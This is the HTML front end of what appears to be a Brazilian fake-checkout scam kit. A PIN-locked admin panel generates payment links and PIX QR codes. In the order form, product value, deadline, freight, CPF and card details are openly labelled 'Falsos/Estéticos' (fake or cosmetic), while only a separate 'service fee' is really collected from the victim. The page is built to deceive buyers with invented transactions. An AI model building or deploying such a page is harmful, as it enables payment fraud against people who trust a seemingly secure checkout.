<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Plataforma Segura - Checkout</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
  <link rel="stylesheet" href="styles.css">
</head>
<body>

  <div id="login-view" class="view-section" style="display:none;">
    <div class="login-container">
      <div class="login-box">
        <i class="fa-solid fa-lock" style="font-size: 40px; color: #00bfa5; margin-bottom: 20px;"></i>
        <h2>Acesso Restrito</h2>
        <p>Digite o PIN de 4 dígitos</p>
        <form id="loginForm">
          <div class="pin-wrapper">
            <input type="password" id="adminPin" maxlength="4" inputmode="numeric" placeholder="••••" required>
          </div>
          <p id="loginError" class="error-msg"></p>
          <button type="submit" class="btn-login">Entrar</button>
        </form>
      </div>
    </div>
  </div>

  <div id="admin-view" class="view-section" style="display:none;">
    <div class="top-bar">
        <button onclick="logoutAdmin()" class="btn-logout"><i class="fa-solid fa-right-from-bracket"></i> Sair</button>
    </div>

    <form id="adminForm">
      <h2 class="admin-title">Novo Pedido Seguro</h2>
      <label>Nome do Comprador</label>
      <input type="text" name="comprador" required placeholder="Nome completo">
      
      <input type="hidden" name="linkPagamento" id="linkPagamento">

      <label>Taxa de Serviço (Valor Real do Checkout)</label>
      <input type="text" name="taxa" class="money" placeholder="R$ 0,00" required>

      <div id="preset-toggle" class="toggle-header">
          <p>DADOS VISUAIS (Falsos/Estéticos)</p>
          <i id="toggle-icon" class="fa-solid fa-chevron-down toggle-icon"></i>
      </div>

      <div id="preset-fields-container" class="collapsed">
        <label>Valor do Produto (Apenas Visual)</label>
        <input type="text" name="valor" class="money" value="R$ 1.000,00">
        <label>Prazo</label>
        <input type="text" name="prazo" value="12 horas">
        <label>Frete</label>
        <input type="text" name="frete" class="money" value="Grátis">
        <label>Tarifa da Plataforma</label>
        <input type="text" name="tarifa" class="money" value="Inclusa">
        <label>CPF Mascarado</label>
        <input type="text" name="cpf" value="406.***.***.01">
        <label>Cartão Mascarado</label>
        <input type="text" name="cartao" value="Mastercard 4588">
      </div>

      <button type="submit" id="btnSalvar">Gerar Link de Pagamento</button>
    </form>

    <div class="modal" id="modalSuccess">
      <div class="modal-box">
        <h3 style="color:#00bfa5; margin-top:0;">Link Gerado!</h3>
        <div class="link-display" id="finalLink">...</div>
        <div class="actions-grid">
          <button class="btn-action btn-copy" id="btnCopy"><i class="fa-regular fa-copy"></i> Copiar</button>
          <a href="#" target="_blank" class="btn-action btn-view" id="btnView"><i class="fa-solid fa-external-link-alt"></i> Visualizar</a>
        </div>
        <button class="btn-action btn-new" onclick="location.reload()">Novo Pedido</button>
      </div>
    </div>
  </div>

  <div id="client-view" class="view-section" style="display:none;">
    <div id="client-content-area">
      <div style="color:#fff; text-align:center; margin-top:50px;">
        <i class="fa-solid fa-circle-notch fa-spin" style="font-size:30px; color:#00bfa5;"></i>
        <p>Carregando transação segura...</p>
      </div>
    </div>
  </div>

  <div id="pixModal" class="modal-overlay">
    <div class="modal-content">
        <button id="closeModalButton" class="close-modal">
            <i class="fa-solid fa-xmark"></i>
        </button>

        <h2 class="modal-header-pix">
            <i class="fa-brands fa-pix" style="color: #32bcad;"></i>
            PIX Gerado com Sucesso!
        </h2>
        
        <div class="pix-body">
            <div id="qrCodeContainer" class="qr-container" style="display: none;">
                <p>Escaneie no App do Banco:</p>
                <img id="qrCodeImage" alt="QR Code PIX">
            </div>
            
            <div class="pix-amount-box">
                <span>Valor Total:</span>
                <span id="modalAmount" class="amount-value"></span>
            </div>

            <div class="pix-copy-box">
                <label>Pix Copia e Cola:</label>
                <textarea id="pixCodeTextarea" readonly rows="3"></textarea>
            </div>

            <button id="copyPixButton" class="btn-pix-action">
                <i class="fa-regular fa-copy"></i>
                <span id="copyButtonText">COPIAR CÓDIGO</span>
            </button>
            
            <p id="modalHash">Hash da transação segura</p>
        </div>
    </div>
  </div>

  <script src="script.js"></script>
</body>
</html>
